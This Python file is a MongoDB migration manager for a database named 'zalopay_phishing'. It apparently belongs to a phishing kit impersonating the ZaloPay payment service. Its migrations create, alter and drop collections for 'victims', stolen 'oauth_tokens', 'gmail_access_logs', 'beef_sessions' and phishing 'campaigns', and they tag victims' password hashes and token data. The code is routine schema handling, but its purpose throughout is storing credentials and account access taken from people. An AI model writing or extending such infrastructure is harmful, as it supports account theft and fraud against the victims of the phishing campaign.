"""
Database Migration System
Version-controlled database migrations for schema changes
"""

import logging
import os
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional
from pymongo import MongoClient
from pymongo.errors import PyMongoError
from bson import ObjectId

logger = logging.getLogger(__name__)

class MigrationManager:
    """Database migration manager"""
    
    def __init__(self, mongo_client: MongoClient):
        self.client = mongo_client
        self.db = mongo_client.get_database("zalopay_phishing")
        self.migrations_collection = self.db.migrations
    
    async def run_migrations(self) -> bool:
        """Run all pending migrations"""
        try:
            logger.info("Starting database migrations...")
            
            # Get current migration version
            current_version = await self.get_current_version()
            
            # Get all available migrations
            available_migrations = self.get_available_migrations()
            
            # Filter pending migrations
            pending_migrations = [
                migration for migration in available_migrations
                if migration["version"] > current_version
            ]
            
            if not pending_migrations:
                logger.info("No pending migrations")
                return True
            
            # Run pending migrations
            for migration in pending_migrations:
                await self.run_migration(migration)
            
            logger.info("All migrations completed successfully")
            return True
            
        except Exception as e:
            logger.error(f"Migration failed: {e}")
            return False
    
    async def get_current_version(self) -> int:
        """Get current migration version"""
        try:
            latest_migration = self.migrations_collection.find_one(
                {},
                sort=[("version", -1)]
            )
            
            if latest_migration:
                return latest_migration["version"]
            else:
                return 0
                
        except Exception as e:
            logger.error(f"Failed to get current migration version: {e}")
            return 0
    
    def get_available_migrations(self) -> List[Dict[str, Any]]:
        """Get all available migrations"""
        return [
            {
                "version": 1,
                "name": "001_initial_setup",
                "description": "Initial database setup with all collections and indexes",
                "up": self.migration_001_initial_setup,
                "down": self.migration_001_initial_setup_down
            },
            {
                "version": 2,
                "name": "002_add_encryption_fields",
                "description": "Add encryption fields to sensitive collections",
                "up": self.migration_002_add_encryption_fields,
                "down": self.migration_002_add_encryption_fields_down
            },
            {
                "version": 3,
                "name": "003_add_audit_trail",
                "description": "Add comprehensive audit trail to all collections",
                "up": self.migration_003_add_audit_trail,
                "down": self.migration_003_add_audit_trail_down
            },
            {
                "version": 4,
                "name": "004_auto_create_indexes",
                "description": "Add missing indexes and TTLs per database schema documentation",
                "up": self.migration_004_auto_create_indexes,
                "down": self.migration_004_auto_create_indexes_down
            }
        ]
    
    async def run_migration(self, migration: Dict[str, Any]):
        """Run a specific migration"""
        try:
            logger.info(f"Running migration {migration['version']}: {migration['name']}")
            
            # Record migration start
            migration_record = {
                "version": migration["version"],
                "name": migration["name"],
                "description": migration["description"],
                "status": "running",
                "started_at": datetime.now(timezone.utc),
                "completed_at": None,
                "error": None
            }
            
            self.migrations_collection.insert_one(migration_record)
            
            # Run migration
            await migration["up"]()
            
            # Update migration record
            self.migrations_collection.update_one(
                {"version": migration["version"]},
                {
                    "$set": {
                        "status": "completed",
                        "completed_at": datetime.now(timezone.utc)
                    }
                }
            )
            
            logger.info(f"Migration {migration['version']} completed successfully")
            
        except Exception as e:
            logger.error(f"Migration {migration['version']} failed: {e}")
            
            # Update migration record with error
            self.migrations_collection.update_one(
                {"version": migration["version"]},
                {
                    "$set": {
                        "status": "failed",
                        "completed_at": datetime.now(timezone.utc),
                        "error": str(e)
                    }
                }
            )
            
            raise
    
    async def migration_001_initial_setup(self):
        """Migration 001: Initial database setup"""
        try:
            # Initialize all collections
            from database.mongodb.init_collections import DatabaseInitializer
            initializer = DatabaseInitializer(self.client)
            await initializer.initialize_all_collections()
            
            logger.info("Migration 001: Initial setup completed")
            
        except Exception as e:
            logger.error(f"Migration 001 failed: {e}")
            raise
    
    async def migration_001_initial_setup_down(self):
        """Rollback migration 001"""
        try:
            # Drop all collections
            collections_to_drop = [
                "victims", "oauth_tokens", "admin_users", "campaigns",
                "activity_logs", "gmail_access_logs", "beef_sessions"
            ]
            
            for collection_name in collections_to_drop:
                if collection_name in self.db.list_collection_names():
                    self.db.drop_collection(collection_name)
            
            logger.info("Migration 001 rollback completed")
            
        except Exception as e:
            logger.error(f"Migration 001 rollback failed: {e}")
            raise
    
    async def migration_002_add_encryption_fields(self):
        """Migration 002: Add encryption fields"""
        try:
            # Add encryption fields to victims collection
            victims_collection = self.db.victims
            victims_collection.update_many(
                {},
                {
                    "$set": {
                        "encryption_version": "1.0",
                        "encrypted_fields": ["password_hash", "additional_data"]
                    }
                }
            )
            
            # Add encryption fields to oauth_tokens collection
            oauth_collection = self.db.oauth_tokens
            oauth_collection.update_many(
                {},
                {
                    "$set": {
                        "encryption_version": "1.0",
                        "encrypted_fields": ["token_data"]
                    }
                }
            )
            
            logger.info("Migration 002: Encryption fields added")
            
        except Exception as e:
            logger.error(f"Migration 002 failed: {e}")
            raise
    
    async def migration_002_add_encryption_fields_down(self):
        """Rollback migration 002"""
        try:
            # Remove encryption fields
            victims_collection = self.db.victims
            victims_collection.update_many(
                {},
                {
                    "$unset": {
                        "encryption_version": "",
                        "encrypted_fields": ""
                    }
                }
            )
            
            oauth_collection = self.db.oauth_tokens
            oauth_collection.update_many(
                {},
                {
                    "$unset": {
                        "encryption_version": "",
                        "encrypted_fields": ""
                    }
                }
            )
            
            logger.info("Migration 002 rollback completed")
            
        except Exception as e:
            logger.error(f"Migration 002 rollback failed: {e}")
            raise
    
    async def migration_003_add_audit_trail(self):
        """Migration 003: Add audit trail"""
        try:
            # Add audit trail fields to all collections
            collections_to_update = [
                "victims", "oauth_tokens", "admin_users", "campaigns",
                "activity_logs", "gmail_access_logs", "beef_sessions"
            ]
            
            for collection_name in collections_to_update:
                collection = self.db[collection_name]
                collection.update_many(
                    {},
                    {
                        "$set": {
                            "audit_trail": {
                                "created_by": "system",
                                "created_at": datetime.now(timezone.utc),
                                "last_modified_by": "system",
                                "last_modified_at": datetime.now(timezone.utc),
                                "version": 1
                            }
                        }
                    }
                )
            
            logger.info("Migration 003: Audit trail added")
            
        except Exception as e:
            logger.error(f"Migration 003 failed: {e}")
            raise
    
    async def migration_003_add_audit_trail_down(self):
        """Rollback migration 003"""
        try:
            # Remove audit trail fields
            collections_to_update = [
                "victims", "oauth_tokens", "admin_users", "campaigns",
                "activity_logs", "gmail_access_logs", "beef_sessions"
            ]

            for collection_name in collections_to_update:
                collection = self.db[collection_name]
                collection.update_many(
                    {},
                    {
                        "$unset": {
                            "audit_trail": ""
                        }
                    }
                )

            logger.info("Migration 003 rollback completed")

        except Exception as e:
            logger.error(f"Migration 003 rollback failed: {e}")
            raise

    async def migration_004_auto_create_indexes(self):
        """Migration 004: Auto-create missing indexes and TTLs"""
        try:
            from database.migrations.auto_create_indexes import run_auto_create_indexes_migration
            success = await run_auto_create_indexes_migration(self.client)

            if not success:
                raise Exception("Auto-create indexes migration failed")

            logger.info("Migration 004: Auto-create indexes completed")

        except Exception as e:
            logger.error(f"Migration 004 failed: {e}")
            raise

    async def migration_004_auto_create_indexes_down(self):
        """Rollback migration 004"""
        try:
            # Note: Index rollback is not implemented as it's complex and potentially destructive
            # In production, indexes should be manually managed
            logger.warning("Migration 004 rollback: Index removal not implemented for safety")
            logger.info("Migration 004 rollback completed (no-op)")

        except Exception as e:
            logger.error(f"Migration 004 rollback failed: {e}")
            raise
    
    async def rollback_migration(self, version: int):
        """Rollback to a specific migration version"""
        try:
            logger.info(f"Rolling back to migration version {version}")
            
            # Get migrations to rollback
            migrations_to_rollback = [
                migration for migration in self.get_available_migrations()
                if migration["version"] > version
            ]
            
            # Sort in reverse order
            migrations_to_rollback.sort(key=lambda x: x["version"], reverse=True)
            
            # Rollback migrations
            for migration in migrations_to_rollback:
                await migration["down"]()
                
                # Remove migration record
                self.migrations_collection.delete_one({"version": migration["version"]})
            
            logger.info(f"Rollback to version {version} completed")
            
        except Exception as e:
            logger.error(f"Rollback failed: {e}")
            raise
    
    async def get_migration_status(self) -> Dict[str, Any]:
        """Get migration status"""
        try:
            # Get all migrations
            migrations = list(self.migrations_collection.find().sort("version", 1))
            
            # Get available migrations
            available_migrations = self.get_available_migrations()
            
            return {
                "current_version": await self.get_current_version(),
                "total_migrations": len(available_migrations),
                "completed_migrations": len(migrations),
                "pending_migrations": len(available_migrations) - len(migrations),
                "migrations": migrations
            }
            
        except Exception as e:
            logger.error(f"Failed to get migration status: {e}")
            return {}

# Run migrations function
async def run_migrations():
    """Run all pending migrations"""
    try:
        from database.connection import connection_pool

        # Initialize database connections if not already done
        if not connection_pool.initialize():
            raise Exception("Failed to initialize database connections")

        # Get MongoDB connection
        mongo_client = connection_pool.get_mongodb()

        # Create migration manager
        migration_manager = MigrationManager(mongo_client)

        # Run migrations
        success = await migration_manager.run_migrations()

        if success:
            logger.info("All migrations completed successfully")
        else:
            logger.error("Migrations failed")

        return success

    except Exception as e:
        logger.error(f"Migration error: {e}")
        return False
